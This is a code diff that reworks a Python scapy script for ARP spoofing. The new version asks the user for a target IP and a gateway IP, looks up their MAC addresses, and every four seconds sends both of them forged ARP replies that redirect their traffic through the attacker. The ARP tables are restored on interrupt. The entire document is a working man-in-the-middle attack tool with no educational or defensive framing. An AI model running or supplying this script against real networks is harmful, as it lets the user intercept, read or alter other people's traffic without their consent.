@@ -63,38 +63,31 @@
 #!/usr/bin/python
 
 import scapy.all as scapy
+import time
 
-def restore_defaults(dest_mac, source_mac, dest_ip, source_ip):
-    # creating the packet
-    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
-    # sending the packet
+interval = 4
+ip_target = input("Enter target IP address: ")
+ip_gateway = input("Enter gateway IP address: ")
+
+def spoof(target_ip, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
-def spoofing(target_mac, target_ip, spoofed_ip):
-    # generating the spoofed packet modifying the source and the target
-    packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoofed_ip)
-    # sending the packet
+def restore(destination_ip, source_ip):
+    destination_mac = scapy.getmacbyip(destination_ip)
+    source_mac = scapy.getmacbyip(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, verbose=False)
 
-def main():
-    # Replace these with the actual MAC and IP addresses of the devices
-    router_mac = "ac-84-c6-78-7d-9f"  # MAC address of the router
-    router_ip = "192.168.0.1"
-    pc_mac = "E0-D4-E8-EB-D1-24"  # MAC address of the PC
-    pc_ip = "192.168.0.106"
+try:
+    while True:
+        spoof(ip_target, ip_gateway)
+        spoof(ip_gateway, ip_target)
+        time.sleep(interval)
+except KeyboardInterrupt:
+    restore(ip_gateway, ip_target)
+    restore(ip_target, ip_gateway)
 
-    try:
-        while True:
-            spoofing(router_mac, router_ip, pc_ip)  # router (target -> spoofed)
-            spoofing(pc_mac, pc_ip, router_ip)  # PC (target -> spoofed)
-    except KeyboardInterrupt:
-        print("[!] Process stopped. Restoring defaults .. please hold")
-        restore_defaults(router_mac, pc_mac, router_ip, pc_ip)  # restore router
-        restore_defaults(pc_mac, router_mac, pc_ip, router_ip)  # restore PC
-        exit(0)
-
-if __name__ == "__main__":
-    main()
 
 # target_ip = "192.168.0.106"  # Enter your target IP
 # gateway_ip = "192.168.0.1"  # Enter your gateway's IP
